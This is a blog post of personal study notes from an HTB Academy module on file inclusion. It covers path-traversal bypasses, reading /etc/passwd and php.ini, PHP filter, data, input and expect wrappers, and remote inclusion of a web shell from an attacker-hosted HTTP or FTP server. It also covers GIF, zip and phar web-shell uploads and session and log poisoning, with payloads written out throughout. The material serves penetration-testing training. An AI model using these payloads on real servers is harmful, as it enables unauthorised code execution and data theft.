---
title: "file inclusion"
date: 2026-02-21 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "Local File Inclusion (LFI), PHP filter/data wrappers, Remote File Inclusion (RFI), and web server log poisoning to RCE."
image:
  path: /assets/img/posts/file_transfers.jpg
  alt: file inclusion
---

```bash
../../../etc/passwd
```

....//....//....//....//etc/passwd As we can see, the inclusion was successful this time, and we're able to read `/etc/passwd` successfully. The `....//` substring is not the only bypass we can use, as we may use `..././` or `....\/` and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. `....\/`), or adding extra forward slashes (e.g. `....////`)

If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool, as follows:

if you did get a vulnerability like this but not rce, you can try to read the files itself to what sanitization they use in order to pass it.

# **Input Filters**

[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

```jsx
php://filter/read=convert.base64-encode/resource=config

http://154.57.164.79:32489/index.php?language=
php://filter/read=convert.base64-encode/resource=configure
```

```jsx
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

```

### **Data**

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

```jsx
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

# **Checking PHP Configurations**

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:

This is for checking if we can achieve rce with these vulnerability

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included:

```jsx
<?php system($_GET["cmd"]); ?>
```

### **Input**

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

## **Expect**

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, `expect` is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can check whether it is configured to load on the back-end server just like we did with `allow_url_include` earlier, but we’d `grep` for `expect` instead:

PHP Wrappers

```bash
Fau5t@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

extension=expect
```

As we can see, the `extension=expect` directive is present in the configuration, which indicates the server is configured to attempt to load the `expect` extension. However, this doesn’t guarantee the extension is actually functional at runtime, as it could fail to load due to a multitude of reasons. Therefore, to confirm that it is actually available, we need to test it directly by attempting command execution using the `expect://` wrapper and then passing the command we want to execute, as follows:

PHP Wrappers

```bash
Fau5t@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# http rfi

Now, we can start a server on our machine with a basic python server with the following command, as follows:

Remote File Inclusion (RFI)

```bash
Fau5t@htb[/htb]$ sudo python3 -m http.server<LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Now, we can include our local shell through RFI, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`. We will also specify the command to be executed with `&cmd=id`:

```jsx
http://<SERVER_IP>:<PORT>/index.php?language=
http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### **FTP**

As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:

Remote File Inclusion (RFI)

```bash
Fau5t@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as follows:

```jsx
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

### **Crafting Malicious Image**

Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:

LFI and File Uploads

```bash
Fau5t@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```jsx
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

# **Zip Upload**

As mentioned earlier, the above technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

LFI and File Uploads

```bash
Fau5t@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

# **Phar Upload**

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

Code: php

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

## Log Poisoning

Function	Read Content	Execute	Remote URL
PHP			
include()/include_once()	✅	✅	✅
require()/require_once()	✅	✅	❌
NodeJS			
res.render()	✅	✅	❌
Java			
import	✅	✅	✅
.NET			
include	✅	✅	✅

![image.png](/assets/img/writeups/file-inclusion_image_64.png)

We can see that the session file contains two values: `page`, which shows the selected language page, and `preference`, which shows the selected language. The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.

Let's try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:

Code: url

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:

This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:

Code: url

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the `&cmd=id` to execute a commands:

## **Server Log Poisoning**

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:

As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

**Tip:** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

To do so, we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`:

### file inclusion prevention

input sanitization

web server config 

waf
